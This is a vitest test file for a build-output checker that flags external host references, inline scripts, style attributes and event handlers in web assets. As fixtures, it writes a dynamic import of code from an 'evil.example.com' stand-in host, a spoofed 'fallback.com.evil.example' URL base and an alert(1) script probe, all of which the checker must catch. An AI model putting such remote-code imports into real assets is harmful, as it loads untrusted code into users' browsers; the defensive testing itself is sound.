// SPDX-License-Identifier: AGPL-3.0-or-later

import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { checkFile, run } from './check-dist.ts';

describe('checkFile', () => {
  it('accepts relative assets and allowed documentation links', () => {
    const html = '<!doctype html><script type="module" src="./assets/index.js"></script><link rel="stylesheet" href="./assets/index.css">';
    expect(checkFile('index.html', html)).toEqual([]);
    expect(checkFile('a.js', 'throw new Error("https://svelte.dev/e/effect_orphan")')).toEqual([]);
    expect(checkFile('a.js', 'new URL(p, "http://fallback.com")')).toEqual([]);
    expect(checkFile('a.js', 'new URL(p, "http://fallback.com.evil.example/")')).toHaveLength(1);
  });
  it('reports external hosts in any file', () => {
    expect(checkFile('a.css', '@import url(https://fonts.example.com/x.css);')).toEqual([
      'a.css: external reference https://fonts.example.com/x.css',
    ]);
    expect(checkFile('a.js', 'fetch("//cdn.example.org/lib.js")')).toHaveLength(1);
  });
  it('reports inline code in HTML', () => {
    expect(checkFile('index.html', '<script>alert(1)</script>')).toEqual(['index.html: inline <script>']);
    expect(checkFile('index.html', '<style>p{}</style>')).toEqual(['index.html: inline <style>']);
    expect(checkFile('index.html', '<p style="color:red">')).toEqual(['index.html: style attribute']);
    expect(checkFile('index.html', '<p onclick="x()">')).toEqual(['index.html: inline event handler']);
  });
});

describe('run', () => {
  it('checks text files in all subdirectories and skips binaries', () => {
    const dist = mkdtempSync(join(tmpdir(), 'dist-'));
    try {
      mkdirSync(join(dist, 'assets'));
      writeFileSync(join(dist, 'index.html'), '<script type="module" src="./assets/a.js"></script>');
      writeFileSync(join(dist, 'assets', 'a.js'), 'import("https://evil.example.com/x.js")');
      writeFileSync(join(dist, 'assets', 'font.woff2'), 'https://ignored.example.com');
      expect(run(dist)).toEqual([`${join('assets', 'a.js')}: external reference https://evil.example.com/x.js`]);
    } finally {
      rmSync(dist, { recursive: true });
    }
  });
});
